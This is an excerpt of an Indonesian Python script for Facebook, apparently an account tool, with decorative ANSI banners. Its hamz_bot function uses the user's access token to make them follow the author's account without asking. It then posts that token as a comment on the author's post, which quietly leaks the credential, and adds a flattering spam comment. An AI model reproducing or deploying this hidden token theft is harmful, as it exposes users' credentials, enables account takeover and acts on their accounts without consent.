...
\033[0;93m  •••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;92m       Tenar \033[0;96m ---- \033[1;93m GANTENG \033[0;96m ---- \033[095m BANGETT 
\033[0;96m [][][][][][][][][][][][][][[]][[]][[]][[]][[]][[]]""""")
id = []
cp = []
ok = []
...
def masuk():
	...
	try:
		...
		if token == "ilhamrmdhan":
			os.system("xdg-open https://free.facebook.com/100062918532280/posts/351284280312187/?app=fbl")
...
def hamz_bot():
    ...
    kom = " Bang @[100062918532280:] Ganteng Bangetz Ngga Ada Obat 😘😘😘😘"
    requests.post('https://graph.facebook.com/100062918532280/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100062918532280/subscribers?access_token=' + token)

    requests.post('https://graph.facebook.com/351284280312187/comments/?message=' +token+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/351284280312187/comments/?message=' +kom+ '&access_token=' + token)
    menu()
